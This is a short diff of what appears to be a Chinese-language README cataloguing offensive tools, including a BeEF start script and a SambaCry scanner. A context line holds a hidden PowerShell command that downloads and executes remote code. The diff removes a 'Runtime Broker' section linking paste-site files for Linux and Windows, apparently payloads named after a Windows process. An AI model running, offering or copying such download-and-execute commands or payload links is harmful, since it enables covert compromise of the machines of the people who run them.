@@ -80,13 +80,6 @@ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring
 ## kali_beef_start
 Kali Beef Framework Start Script
 
-## Runtime Broker
-
-+ https://share.dmca.gripe/PcH4etGtRBxAHqlW.txt	Linux
-+ https://share.dmca.gripe/VB9D9enog03XrsIi.txt	Winndwos online
-+ https://share.dmca.gripe/NzwQ12XcKipA3Ie6.txt	Winndwos offine
-+ https://share.dmca.gripe/0WfFxN2u1qhekMRS.txt	Windows online dll
-
 ## SambaCry漏洞扫描程序
 存档的密码:`sambacry` <br>
 参考:https://bi.zone/news/vulnerability-scanner-sambacry/
